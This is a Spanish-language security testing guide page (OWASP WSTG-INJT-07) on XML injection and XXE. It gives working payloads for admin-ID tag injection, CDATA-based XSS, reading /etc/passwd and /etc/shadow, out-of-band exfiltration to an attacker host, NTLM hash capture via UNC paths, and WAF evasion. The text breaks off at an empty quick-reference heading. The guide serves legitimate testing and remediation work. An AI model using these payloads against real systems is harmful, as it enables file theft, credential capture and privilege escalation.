# Inyección XML

|ID          |
|------------|
|WSTG-INJT-07|

## Resumen

Las pruebas de inyección XML consisten en intentar inyectar o manipular un documento XML dentro de una aplicación. Si el analizador XML no valida los datos según el contexto o está configurado de forma insegura, la prueba dará un resultado positivo.

Esta sección describe ejemplos prácticos de inyección XML. Primero, se definirá una API de comunicación basada en XML y se explicarán sus principios de funcionamiento. Luego, se demostrará el método de descubrimiento, que consiste en intentar insertar metacaracteres XML. Una vez completado el primer paso, el probador tendrá información sobre la estructura XML, lo que permitirá inyectar datos y etiquetas XML (inyección de etiquetas), o aprovechar la configuración del analizador para acceder a recursos locales y remotos (inyección de entidades externas XML o XXE).

## Objetivos de la prueba

- Identificar puntos de inyección XML.
- Evaluar los tipos de exploits que se pueden lograr y su gravedad.

## Cómo probar

Supongamos que hay una aplicación web moderna o un servicio web (como una API SOAP o RESTful) que acepta datos en formato XML para el registro de usuarios.

Cuando un usuario se registra rellenando un formulario HTML o interactuando con una aplicación cliente, la aplicación envía los datos del usuario en una solicitud `POST` que contiene una carga útil XML:

```http
POST /api/addUser HTTP/1.1
Host: www.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>
```

La aplicación de backend analiza esta carga útil XML e inserta los valores analizados en la base de datos o en el estado interno (a menudo, los complementa con campos generados por el servidor, como `userid`). Si la aplicación construye dinámicamente respuestas XML o reenvía estos datos XML a otro sistema de backend concatenando cadenas sin una sanitización adecuada, es vulnerable a la inyección estructural XML. Como alternativa, si el propio analizador XML está configurado de forma insegura, es vulnerable a ataques basados en entidades (XXE).

### Descubrimiento

El primer paso para probar si una aplicación presenta una vulnerabilidad de inyección XML consiste en intentar insertar metacaracteres XML.

Los metacaracteres XML son:

- Comillas simples y dobles (`'` y `"`): Si no se sanitizan, estos caracteres pueden provocar una excepción durante el análisis XML o permitir que un atacante cierre prematuramente un atributo. Esto ocurre cuando la comilla inyectada coincide con el carácter utilizado para delimitar el valor del atributo.

Por ejemplo, supongamos que una aplicación usa comillas simples para los atributos:

`<node attrib='$inputValue'/>`

Si se proporciona la carga útil `$inputValue = foo'`, el XML resultante es:

`<node attrib='foo''/>`

El documento XML resultante está mal formado y no es válido. La misma lógica se aplica a las comillas dobles (`"`) si el atributo está delimitado por comillas dobles (por ejemplo, `<node attrib="$inputValue"/>`).

- Paréntesis angulares: `>` y `<` - Al añadir un paréntesis angular de apertura o cierre a una entrada de usuario, como la siguiente:

`Username = foo<`

la aplicación construirá un nuevo nodo:

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>
```

pero, debido a la presencia del carácter de apertura `<`, el documento XML resultante no es válido.

- Etiqueta de comentario: `<!--` y `-->` - Esta secuencia de caracteres se interpreta como el inicio o el fin de un comentario. Por lo tanto, al inyectar una de estas secuencias en el parámetro Username:

`Username = foo<!--`

la aplicación construirá un nodo como el siguiente:

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>
```

que no será una secuencia XML válida.

- Ampersand: `&`- El ampersand se usa en la sintaxis XML para representar entidades. El formato de una entidad es `&symbol;`. Una entidad se asigna a un carácter del conjunto de caracteres Unicode.

Por ejemplo:

`<tagnode>&lt;</tagnode>`

está bien formado y es válido, y representa el carácter ASCII `<`.

Si el propio `&` no se codifica como `&amp;`, podría usarse para probar la inyección XML.

De hecho, si se proporciona una entrada como la siguiente:

`Username = &foo`

se creará un nuevo nodo:

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>
```

pero, de nuevo, el documento no es válido: `&foo` no termina con `;` y la entidad `&foo;` no está definida.

- Delimitadores de sección CDATA: `<![CDATA[` y `]]>` - Las secciones CDATA se usan para escapar bloques de texto que contienen caracteres que, de otro modo, se reconocerían como marcado. En otras palabras, un analizador XML no analiza los caracteres encerrados en una sección CDATA.

Por ejemplo, si es necesario representar la cadena `<foo>` dentro de un nodo de texto, se puede usar una sección CDATA:

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

de modo que `<foo>` no se analice como marcado y se considere como datos de caracteres.

Si se crea un nodo de la siguiente manera:

`<username><![CDATA[<$userName]]></username>`

el probador podría intentar inyectar la cadena de cierre de CDATA `]]>` para invalidar el documento XML.

`userName = ]]>`

esto se convertirá en:

`<username><![CDATA[]]>]]></username>`

que no es un fragmento XML válido.

Otra prueba está relacionada con la etiqueta CDATA. Supongamos que el documento XML se procesa para generar una página HTML. En este caso, los delimitadores de sección CDATA podrían eliminarse sin inspeccionar más su contenido. Entonces, es posible inyectar etiquetas HTML que se incluirán en la página generada, eludiendo por completo las rutinas de sanitización existentes.

Consideremos un ejemplo concreto. Supongamos que tenemos un nodo que contiene texto que se mostrará al usuario.

```xml
<html>
    $HTMLCode
</html>
```

Entonces, un atacante puede proporcionar la siguiente entrada:

```txt
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
```

y obtener el siguiente nodo:

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

Durante el procesamiento, los delimitadores de sección CDATA se eliminan y se genera el siguiente código HTML:

```html
<script>
    alert('XSS')
</script>
```

El resultado es que la aplicación es vulnerable a XSS.

### Inyección de etiquetas

Una vez completado el primer paso y mapeada la estructura XML por el probador, es posible intentar inyectar etiquetas XML completas. Esto puede provocar elusión de la lógica o escalada de privilegios si la aplicación usa el XML analizado para tomar decisiones de autorización.

Consideremos una situación en la que la entrada del usuario se concatena directamente en una solicitud XML de backend. La aplicación construye dinámicamente el siguiente nodo XML para comunicarse con un servicio interno:

```xml
<user>
    <username>$username</username>
    <password>$password</password>
    <userid>500</userid>
    <email>$email</email>
</user>
```

Al manipular el campo de entrada $email, el probador puede inyectar una etiqueta de cierre para el elemento actual e iniciar uno nuevo. Si la entrada inyectada es:

```xml
s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com
```

El backend generará el siguiente XML:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com</email>
</user>
```

El XML resultante está bien formado. Además, es probable que el analizador XML procese secuencialmente las etiquetas `<userid>` duplicadas y sobrescriba el valor inicial (`500`) con el último valor proporcionado (`0`, que a menudo representa un ID de administrador). En este caso, el probador ha inyectado correctamente un usuario con privilegios administrativos.

El único problema es que las etiquetas `userid` y `email` aparecen dos veces. A menudo, los documentos XML se validan con un esquema o una definición de tipo de documento (DTD) y se rechazan si no cumplen las reglas estrictas de cardinalidad.

Supongamos que la DTD del documento XML del backend especifica de forma estricta exactamente una etiqueta `userid` y una etiqueta `email` por usuario:

```xml
<!DOCTYPE user [
    <!ELEMENT user (username,password,userid,email) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT email (#PCDATA) >
]>
```

En este caso, el sencillo ataque de inyección de etiquetas descrito anteriormente fallará en la validación antes de que se realice ningún procesamiento.

Sin embargo, esta defensa puede eludirse si el probador controla los valores de varios nodos. Al inyectar una secuencia de inicio de comentario XML (`<!--`) en un campo y una secuencia de fin de comentario XML (`-->`) en otro, se pueden ocultar los nodos originales generados por el servidor.

Por ejemplo, el probador proporciona las siguientes cargas útiles para las entradas:

- Username: tony
- Password: `Un6R34kb!e</password><!--`
- Email: `--><userid>0</userid><email>s4tan@hell.com`

La aplicación de backend concatena estos valores en la estructura XML:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password><!--</password>
    <userid>500</userid>
    <email>--><userid>0</userid><email>s4tan@hell.com</email>
</user>
```

El nodo original `<userid>500</userid>` y las etiquetas duplicadas se han comentado correctamente, dejando solo el `<userid>0</userid>` inyectado. Ahora, el documento cumple las reglas estrictas de la DTD y la escalada de privilegios tiene éxito.

### Inyección de entidades externas XML (XXE)

El conjunto de entidades XML válidas puede ampliarse definiendo entidades nuevas. Si la definición de una entidad es un URI, se denomina entidad externa. A menos que se configure de otro modo, las entidades externas obligan al analizador XML a acceder al recurso especificado por el URI, por ejemplo, a un archivo en la máquina local o en un sistema remoto. Este comportamiento expone la aplicación a ataques de entidades externas XML (XXE), que pueden usarse para provocar denegación de servicio, obtener acceso no autorizado a archivos, escanear redes internas y realizar falsificación de solicitudes del lado del servidor (SSRF).

Para probar vulnerabilidades XXE básicas, se puede inyectar una declaración `DOCTYPE` con una entidad externa en la carga útil XML:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE user [ 
    <!ELEMENT user ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >
]>
<user>
    <username>&xxe;</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>
```

> Nota: El nombre de `DOCTYPE` (`user`) coincide con el elemento raíz real del documento, y la declaración `ELEMENT` hace referencia a ese mismo elemento raíz. Un nombre `DOCTYPE`/`ELEMENT` que no coincida o que haya quedado de otro ejemplo (un error común al copiar y adaptar cargas útiles XXE a un nuevo endpoint) seguirá siendo aceptado por la mayoría de los analizadores que no realizan validación, pero mantenerlos coherentes evita errores con los analizadores que sí validan la DTD.

Esta prueba puede provocar una denegación de servicio en sistemas Unix si el analizador XML intenta resolver la entidad leyendo `/dev/random`, lo que puede bloquearlo indefinidamente (o consumir recursos significativos) mientras intenta sustituir el valor de la entidad.

Otras cargas útiles útiles para probar la divulgación de archivos locales son:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
<!ENTITY xxe SYSTEM "file:///etc/shadow" >
<!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini" >
<!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >
```

### XXE a ciegas

En muchos casos reales, la aplicación no devuelve el valor de una entidad externa en la respuesta HTTP, por lo que el ejemplo clásico de `/etc/passwd` en la respuesta anterior no se aplica directamente. Esto se conoce como **XXE a ciegas**. La vulnerabilidad sigue presente y puede explotarse, pero su detección y la exfiltración de datos requieren técnicas fuera de banda (OOB) o, cuando se bloquea el tráfico OOB, una técnica basada en errores.

#### Detección fuera de banda (OOB) mediante entidades de parámetro

Algunos analizadores o reglas WAF bloquean las entidades generales clásicas (`&xxe;`), pero no restringen las **entidades de parámetro**, que solo pueden referenciarse dentro de una DTD y se declaran con `%` en lugar de `&`. Un probador puede usar una entidad de parámetro para obligar al servidor de destino a realizar una solicitud DNS/HTTP saliente a un receptor controlado por el atacante (por ejemplo, Burp Collaborator, `interact.sh` o un receptor HTTP/netcat sencillo), lo que confirma que la inyección está activa aunque no se devuelva nada en la respuesta:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/collect">
  %xxe;
]>
<foo>test</foo>
```

Una consulta DNS o una solicitud HTTP recibida por el receptor confirma que el analizador XML resuelve entidades externas; es decir, que la aplicación es vulnerable, incluso si la respuesta es completamente ciega.

#### Exfiltración de datos fuera de banda mediante una DTD externa maliciosa

Una vez confirmada la interacción OOB, el probador puede pasar de la detección a la exfiltración real de archivos alojando una DTD externa maliciosa en un servidor controlado por el atacante y encadenando entidades de parámetro para sacar el contenido del archivo dentro de una solicitud posterior.

DTD maliciosa alojada en `http://<tester-controlled-host>/evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<tester-controlled-host>/?data=%file;'>">
%eval;
%exfil;
```

Carga útil enviada a la aplicación de destino:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

Cuando el destino analiza este documento, obtiene `evil.dtd`, lee el archivo local en la entidad `%file;` y luego realiza una segunda solicitud saliente que incluye el contenido del archivo como parámetro de consulta, que el probador captura en su receptor. Como las URL no pueden transportar de forma segura datos binarios arbitrarios o datos con saltos de línea, esta técnica suele limitarse a texto de una sola línea y seguro para URL; para archivos binarios o archivos que contienen caracteres que rompen la URL, los probadores suelen combinarla con un contenedor específico del lenguaje (por ejemplo, `php://filter/convert.base64-encode/resource=` de PHP) para codificar en base64 el contenido del archivo antes de exfiltrarlo, cuando la pila del destino lo admite.

#### Exfiltración basada en errores mediante una DTD externa remota

Esta variante sigue requiriendo que el destino realice una conexión saliente (para obtener la DTD del probador), pero, a diferencia de la técnica OOB anterior, no requiere que el servidor del atacante reciba una *segunda* solicitud con los datos. El contenido del archivo se filtra a través de la propia respuesta de error de la aplicación, en lugar de mediante una llamada de red. Esto es útil cuando se permiten conexiones salientes, pero el cuerpo de respuesta de la segunda solicitud de exfiltración nunca llegaría al probador.

DTD alojada en `http://<tester-controlled-host>/error.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Carga útil:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/error.dtd">
  %xxe;
]>
<foo>test</foo>
```

El analizador obtiene la DTD, intenta resolver una ruta inexistente construida concatenando el contenido del archivo de destino, falla y —según el analizador y el nivel de detalle del manejo de errores de la aplicación— lanza una excepción cuyo mensaje revela la ruta intentada y, por lo tanto, el contenido del archivo. Si la aplicación devuelve errores sin procesar del analizador en su respuesta, el contenido del archivo se revela directamente.

#### Exfiltración basada en errores mediante la reutilización de una DTD local (sin conectividad saliente)

La técnica anterior sigue necesitando una solicitud saliente. Si el entorno de destino realmente no tiene conectividad saliente (el tráfico saliente está completamente filtrado), tampoco es una opción; además, un `DOCTYPE` completamente *interno* normalmente no puede redefinir una entidad de parámetro dentro de la definición de otra entidad de parámetro (la especificación XML solo lo permite dentro de DTD externas, y la mayoría de los analizadores lo hacen cumplir).

Una solución fiable consiste en referenciar un archivo DTD que ya exista en el sistema de archivos local del propio destino como DTD «externa» (cargada mediante `file://` en lugar de `http://`) y, luego, redefinir una de las entidades que esa DTD ya declara. Como la DTD reutilizada sigue siendo técnicamente «externa» desde el punto de vista del analizador (aunque no se acceda a la red), la técnica de redefinición de entidades de parámetro vuelve a ser válida y se puede provocar la misma filtración basada en errores sin conectividad saliente.

Para esto es necesario conocer la ruta de un archivo DTD que realmente exista en el servidor. Entre los candidatos comunes que vale la pena probar están las bibliotecas de procesamiento XML incluidas con el servidor de aplicaciones (DTD de aplicaciones o servlets incluidas en archivos JAR) y DTD del sistema operativo, como la DTD de documentación GNOME/Yelp que existe en muchos sistemas Linux (`/usr/share/yelp/dtd/docbookx.dtd`). Un probador puede enumerar candidatos enviando una carga útil que solo cargue la DTD (sin redefinir nada). Si el archivo no existe, el analizador lanza un error de archivo no encontrado, por lo que se puede probar, de una en una, una lista de palabras de rutas DTD conocidas.

Ejemplo, suponiendo que `/usr/local/app/schema.dtd` existe en el destino y define una entidad llamada `custom_entity`:

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

La redefinición de `custom_entity` usa referencias numéricas a caracteres (`&#x25;` para `%`, `&#x26;` para `&`, `&#x27;` para `'`) en lugar de los caracteres literales. Esto es necesario, no es una cuestión de estilo: el texto de reemplazo se vuelve a analizar como marcado DTD una vez sustituido, por lo que cualquier `%` o `&` literal se expandiría de inmediato en lugar de permanecer intacto hasta que la redefinición surta efecto. Las referencias numéricas aplazan esa expansión hasta la etapa correcta.

Esto carga la DTD local, sustituye su definición de `custom_entity` por la carga útil de exfiltración basada en errores y, luego, invoca `%local_dtd;` para que el analizador procese la entidad redefinida. Así se provoca la misma filtración del contenido del archivo en el mensaje de error que en el ejemplo anterior, pero sin que salga del servidor ni un solo byte de tráfico de red. Herramientas como el proyecto [dtd-finder](https://github.com/GoSecure/dtd-finder) mantienen listas de rutas conocidas a archivos DTD (y pueden buscar DTD presentes en un sistema de archivos o una imagen de contenedor) para agilizar esta búsqueda.

### Ataques XInclude

A veces, el probador solo controla un valor que luego se incorpora a un documento XML más grande generado por el servidor (por ejemplo, un campo de formulario que termina dentro de una solicitud SOAP de backend). En ese caso, el probador no puede controlar ni inyectar una declaración `<!DOCTYPE>`, lo que descarta los ataques clásicos basados en entidades descritos anteriormente. **XInclude** es una parte independiente de la especificación XML que permite que un documento XML importe contenido de otra fuente, y puede activarse desde un valor de datos común, sin necesidad de `DOCTYPE`:

```txt
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

Si el backend incorpora este valor sin escaparlo en su propio documento XML y su analizador tiene habilitado el procesamiento XInclude, el contenido del archivo referenciado se inserta en ese punto del documento resultante.

### XXE mediante la carga de archivos

Muchas aplicaciones aceptan la carga de formatos de archivo basados en XML o que contienen partes XML incrustadas, incluso cuando la interfaz de carga solo indica «documentos» o «imágenes». A menudo se pasan por alto como puntos de inyección porque el probador no está interactuando con una API XML evidente.

#### SVG

SVG es un formato de imagen basado en XML. Si una aplicación acepta cargas SVG (o acepta formatos de imagen arbitrarios y procesa SVG), un archivo SVG especialmente creado puede incluir un DOCTYPE con una entidad externa que se resuelve durante el procesamiento o la renderización. Según el flujo de trabajo, el valor resuelto incluso podría mostrarse de forma visible dentro de la imagen generada:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### Documentos Office Open XML (DOCX / XLSX / PPTX)

Los formatos de oficina modernos son archivos ZIP que contienen varias partes XML. Un probador puede descomprimir un archivo de muestra legítimo, inyectar un DOCTYPE/una entidad en una de las partes XML internas, volver a comprimirlo y cargarlo en cualquier función que analice o convierta documentos en el servidor (generación de vistas previas, extracción de texto, conversión de formato, etc.).

Ejemplo: modificar `word/document.xml` dentro de un `.docx`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

El mismo enfoque se aplica a `xl/workbook.xml` en archivos `.xlsx` y a las partes equivalentes en archivos `.pptx`. Conviene probarlo en cualquier endpoint que procese documentos de oficina para indexarlos, generar miniaturas o convertirlos: estas canalizaciones suelen basarse en bibliotecas XML antiguas o configuradas de forma poco estricta, aunque se haya reforzado la capa API principal de la aplicación.

#### Otros formatos basados en XML

Los probadores también deberían tener en cuenta formatos basados en XML menos evidentes que una aplicación podría aceptar como entrada, incluidos XLIFF (archivos de intercambio de traducciones), fuentes RSS/Atom, envoltorios SOAP y cualquier formato de importación personalizado documentado como «XML» o «basado en XML». Cualquiera de ellos puede contener las mismas cargas útiles DOCTYPE/entidad o XInclude descritas anteriormente.

### Aumento del impacto: SSRF y captura de credenciales

XXE no se limita a la divulgación de archivos locales: el mismo mecanismo de entidades externas sirve para falsificar solicitudes, por lo que los probadores deberían evaluar el impacto más allá de `/etc/passwd`:

- **SSRF contra servicios de metadatos en la nube.** En objetivos alojados en la nube, dirigir una entidad al endpoint de metadatos de la instancia (por ejemplo, `http://169.254.169.254/...` en AWS) puede revelar credenciales temporales. Sin embargo, hay que tener en cuenta que la configuración predeterminada actual de AWS, IMDSv2, requiere una solicitud `PUT` y un encabezado personalizado para obtener un token de sesión antes de que se pueda completar cualquier solicitud `GET`; una SSRF inducida mediante XXE (a través de un identificador `SYSTEM`) normalmente solo puede emitir un `GET` simple. En la práctica, esto significa que la obtención clásica de credenciales de metadatos mediante XXE suele funcionar actualmente solo con instancias antiguas o configuradas de forma explícitamente incorrecta que aún tengan habilitado IMDSv1 (`HttpTokens` no establecido en `required`). Compruebe las opciones de metadatos de la instancia en lugar de dar por hecho que el endpoint es explotable de forma predeterminada. Los endpoints equivalentes de metadatos de Azure y GCP también requieren encabezados específicos (`Metadata: true` / `Metadata-Flavor: Google`) que una entidad `SYSTEM "http://..."` simple no puede establecer, por la misma razón. Aunque se bloquee el robo directo de credenciales, acceder al endpoint de metadatos sigue siendo útil para confirmar la SSRF y averiguar en qué nube se ejecuta el objetivo.
- **Escaneo de puertos y redes internas.** Las diferencias en el tiempo de respuesta o en los mensajes de error entre hosts o puertos internos accesibles e inaccesibles pueden usarse para trazar la topología de la red interna a través del servidor vulnerable.
- **Captura de credenciales mediante rutas UNC (Windows).** En analizadores alojados en Windows, dirigir una entidad a una ruta UNC (`file://///attacker-ip/share/x`) puede hacer que el servidor intente autenticarse mediante SMB ante un receptor controlado por el probador, filtrando el hash NTLM de la cuenta de servicio para que se descifre sin conexión.

Estos impactos deberían reflejarse en la puntuación de gravedad de un hallazgo, de acuerdo con los objetivos de la prueba descritos anteriormente: una XXE a ciegas que solo permite leer archivos y una XXE que obtiene credenciales de la nube son hallazgos muy diferentes, aunque el punto de inyección sea idéntico.

### Técnicas para eludir filtros y WAF

Si las cargas útiles `<!DOCTYPE` sencillas se bloquean o eliminan, vale la pena probar las siguientes variantes antes de concluir que la aplicación no es vulnerable:

- **Codificar la carga útil:** Algunos analizadores aceptan codificaciones de entrada alternativas (por ejemplo, UTF-7) que no contienen las secuencias de bytes literales que busca un filtro, pero que la biblioteca subyacente decodifica y analiza como XML antes de que se ejecute la lógica del filtro. Volver a codificar toda la carga útil puede eludir filtros ingenuos basados en firmas que solo buscan `<!DOCTYPE` o `<!ENTITY` en texto sin formato.
- **URI de datos (`data:`):** Si el manejo de protocolos del analizador lo permite, se puede introducir de contrabando una carga útil codificada en base64 mediante una entidad de parámetro `data:text/plain;base64,...`, para que el contenido DTD real no aparezca en la solicitud en texto sin formato.
- **Contenedores de protocolo alternativos en lugar de `file://`:** En pilas basadas en PHP, contenedores como `php://filter/convert.base64-encode/resource=` permiten eludir filtros ingenuos de cadenas `file://` y resuelven además el problema independiente de exfiltrar contenido binario o con varias líneas (véase la nota sobre exfiltración OOB anterior). En pilas basadas en Java, se puede usar el protocolo `jar:` para acceder a archivos dentro de un archivo ZIP/JAR, incluido uno obtenido de una URL remota; es útil cuando se bloquea el acceso directo mediante `file://`, pero no el acceso a archivos comprimidos.
- **Repartir la confianza entre dos codificaciones:** Un número reducido de analizadores decodifica las referencias numéricas a caracteres HTML dentro del valor de una entidad antes de volver a analizarlo como fragmento DTD. Cuando esto ocurre, expresar las palabras clave bloqueadas como referencias numéricas a caracteres puede eludir un filtro que solo reconoce la cadena literal.

Como siempre con las técnicas para eludir filtros, compruebe que la versión y el analizador subyacente presenten realmente el comportamiento esperado, en lugar de suponer que alguno de los métodos anteriores funciona de manera universal: son posibilidades que conviene probar, no técnicas de evasión garantizadas.

### Nota sobre los valores predeterminados de los analizadores modernos

Muchas bibliotecas y marcos de análisis XML actuales vienen con la resolución de entidades externas deshabilitada de forma predeterminada o proporcionan una opción documentada de «procesamiento seguro» que los probadores deberían confirmar que realmente se utiliza (esto **no** significa que se puedan omitir las pruebas de XXE; consulte la [Hoja de referencia para la prevención de entidades externas XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)). En la práctica, las vulnerabilidades XXE explotables hoy en día suelen encontrarse en los siguientes casos:

- Se configuró de forma segura un analizador para la API principal de la aplicación, pero una ruta de código secundaria (procesamiento de cargas de archivos, conversión de documentos, generación de informes o un endpoint SOAP heredado) usa otra instancia de analizador sin reforzar.
- Se deshabilitaron las DTD, pero se dejó habilitado el procesamiento XInclude (suelen ser opciones de configuración distintas).
- Una biblioteca o dependencia de terceros incorpora su propio análisis XML con valores predeterminados inseguros.
- Se siguen usando analizadores antiguos o personalizados (dispositivos integrados y pilas Java/C heredadas).

Por lo tanto, los probadores deberían probar cada ruta de código que consuma XML de forma independiente, en lugar de dar por hecho que proteger un endpoint de API protege toda la aplicación.

## Pruebas de caja blanca

Al revisar el código fuente, compruebe que los analizadores XML estén configurados de forma segura para deshabilitar `DOCTYPE`, las DTD externas y las entidades de parámetro externas.

Para ver ejemplos completos de configuración segura en todos los lenguajes, consulte la [Hoja de referencia para la prevención de entidades externas XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

### Java

Las siguientes API de Java pueden ser vulnerables a XXE si no están configuradas correctamente:

- `javax.xml.parsers.DocumentBuilder` / `DocumentBuilderFactory`
- `javax.xml.parsers.SAXParser` / `SAXParserFactory`
- `javax.xml.stream.XMLInputFactory`
- `javax.xml.transform.TransformerFactory` / `SAXTransformerFactory`
- `org.xml.sax.XMLReader` / `EntityResolver`
- `org.dom4j.io.SAXReader`
- `org.jdom2.input.SAXBuilder`
- `Xerces`: `DOMParser`, `SAXParser`, `XMLParser`

> **Nota:** Las bibliotecas de terceros que procesan formatos basados en XML (como Apache POI para documentos OOXML) también pueden introducir vulnerabilidades XXE y XEE. Al revisar el código, busque palabras clave asociadas con vulnerabilidades históricas, como `XSSFExportToXml` o configuraciones OPC SAX inseguras. Compruebe siempre la versión de la biblioteca frente a los avisos de seguridad conocidos (por ejemplo, [detalles de CVE de Apache POI](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-22766/Apache-POI.html)), en lugar de dar por hecho que es segura de forma predeterminada.

### C / C++

Las siguientes palabras clave del código fuente pueden indicar implementaciones vulnerables:

- **libxml2:** `xmlCtxtReadMemory`, `xmlCtxtUseOptions`, `xmlParseInNodeContext`, `xmlReadDoc`, `xmlReadFd`, `xmlReadFile`, `xmlReadIO`, `xmlReadMemory`, `xmlCtxtReadDoc`, `xmlCtxtReadFd`, `xmlCtxtReadFile`, `xmlCtxtReadIO`
- **libxerces-c:** `XercesDOMParser`, `SAXParser`, `SAX2XMLReader`

### Python

Se deberían revisar los siguientes paquetes y funciones:

- `xml.etree.ElementTree` y `xml.dom.minidom`: Aunque en las versiones actuales de CPython no expanden entidades externas de forma predeterminada, siguen siendo susceptibles a ataques de denegación de servicio (DoS) del tipo expansión de entidades y a otros casos límite.
- `lxml`: Compruebe si el analizador se instancia explícitamente con `resolve_entities=True` (y `no_network=False`), lo que habilita XXE.
- **Recomendación:** `defusedxml` es el reemplazo directo estándar de los módulos XML de la biblioteca estándar para mitigar de manera uniforme los riesgos de XXE y DoS.

### Node.js / JavaScript

Busque bibliotecas heredadas o configuradas de forma poco estricta:

- `libxmljs`: La sustitución de entidades externas está desactivada de forma predeterminada; compruebe si se usa explícitamente la opción `{ noent: true }`, que vuelve a habilitarla.
- `xml2js`: Esta biblioteca utiliza internamente analizadores de JavaScript puro, como `sax-js`. Aunque no resuelve entidades externas de forma predeterminada, puede ser vulnerable a ataques DoS. Compruebe si la opción `strict` está establecida explícitamente en `false`.
- `xml2json`: Este módulo utiliza internamente `node-expat` (vinculaciones C/C++ al analizador Expat). Aunque Expat suele ser seguro de forma predeterminada frente a la divulgación clásica de archivos mediante XXE, puede ser susceptible a la expansión de entidades XML (DoS) si no se restringe explícitamente.
- `xmldom`: Revise si hay configuraciones explícitas de resolución de entidades, ya que el comportamiento y las capacidades predeterminados han variado históricamente según la versión.

## Corrección

La solución más fiable para los problemas de tipo XXE es eliminar por completo la capacidad del analizador de resolver recursos externos, en lugar de intentar filtrar o sanitizar la entrada XML. Principios generales, por orden de prioridad:

- **Deshabilite por completo el procesamiento de DTD** cuando la aplicación no lo necesite por motivos funcionales legítimos. La mayoría del XML de aplicaciones (cargas útiles de API, cargas de archivos de configuración, envíos de formularios convertidos a XML) no necesita legítimamente un DOCTYPE.
- Si no se pueden deshabilitar las DTD, **deshabilite la resolución de entidades generales y de parámetro externas** y **deshabilite el procesamiento XInclude**. Normalmente, son opciones distintas de la opción de DTD, por lo que desactivar una no garantiza que las demás estén desactivadas.
- Cuando estén disponibles, prefiera las API o las opciones de configuración del analizador descritas como «procesamiento seguro», pero compruebe qué cubre realmente esa opción en el analizador y la versión específicos, en lugar de suponer que deshabilita todo lo anterior.
- Aplique esta configuración a **todas** las instancias de analizadores en el código base y sus dependencias, no solo a la capa principal de API. El manejo de cargas de archivos, la conversión de documentos y la generación de vistas previas, los trabajos de importación/exportación, los clientes SOAP y las bibliotecas de terceros crean sus propias instancias de analizadores y deben revisarse de forma independiente.
- Cuando las entidades externas sean necesarias, implemente una **lista de permitidos** estricta de URI o esquemas permitidos, en lugar de depender de una **lista de bloqueados** para protocolos peligrosos como `file://`, `ftp://`, etc.
- Aplique defensa en profundidad: ejecute los procesos que analizan XML con el mínimo de privilegios (sin acceso a archivos confidenciales y sin acceso saliente a la red cuando no sea necesario) y mantenga actualizadas las bibliotecas XML, ya que los valores predeterminados de los analizadores y las técnicas de elusión conocidas cambian entre versiones.

Referencia rápida por ecosistema (compruebe la documentación actual de la biblioteca y la versión exactas que se utilizan, ya que los valores predeterminados han cambiado con el tiempo y varían según la biblioteca):

